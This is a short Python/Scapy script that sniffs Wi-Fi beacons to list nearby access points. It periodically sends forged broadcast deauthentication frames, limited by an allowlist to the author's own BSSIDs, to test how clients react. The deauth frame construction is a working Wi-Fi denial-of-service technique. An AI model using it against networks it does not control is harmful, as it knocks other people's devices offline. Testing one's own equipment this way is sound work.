from scapy.all import *

# Modify as appropriate
interface="wlan1mon"

# Key: BSSID value: SSID - can have the same SSID with multiple
# BSSIDs in (for example) an enterprise deployment
bsses = {}
# List of all heard BSSes over all time
saved_bsses = {}

# Broadcast address
bcst = "ff:ff:ff:ff:ff:ff"

# Modify as appropriate, only do testing on your own BSSes
my_bsses = {"00:26:86:f0:7d:67", "00:26:86:f1:12:f4"}

# How many packets to sniff prior to restarting everything?
pkts_to_deauth_ratio = 1000

count = 0

def dump_bsses(prolog, bss_dict):
    print(prolog)
    for bssid, ssid in bss_dict.items():
        print(f"BSSID {bssid} ({ssid})")

# Simple program to gather information from beacons on which BSSes are
# broadcasting on the current channel, then every now and then send out
# broadcast deauth frames to check how the clients handle this situation
while True:
    count += 1
    # sniff one...
    pkt = sniff(iface=interface, count=1)[0]

    # Check for beacon
    if pkt.haslayer(Dot11Beacon):
        ssid_elt = pkt.getlayer(Dot11Elt)[0]
        # Element 0 is SSID - element 0 should always be the first
        # information element in normal beacons.
        bssid = pkt.addr2
        if ssid_elt.ID==0:
            ssid = ssid_elt.info.decode('utf-8')
            if bssid not in bsses:
                bsses[bssid] = ssid
                print(f"Found BSS, SSID: {ssid}({bssid})")

    # From time to time deauth all the clients on the discovered BSSes
    if count > pkts_to_deauth_ratio:
        print("Deauthing time...")
        for bssid, ssid in bsses.items():
            # List of all BSSes over all time
            saved_bsses[bssid] = ssid
            if bssid not in my_bsses:
                print(f"Not deauthing on BSSes I don't run {bssid}")
                continue
            deauth=RadioTap()/Dot11(addr1=bcst, addr2=bssid, addr3=bssid)/Dot11Deauth()
            for i in range(1,10):
                print(f"Send deauth pkt {i} to clients on BSSID {bssid}({ssid})")
                sendp(deauth, iface=interface)
        bsses = {}
        dump_bsses("All BSSes detected so far", saved_bsses)
        count = 0

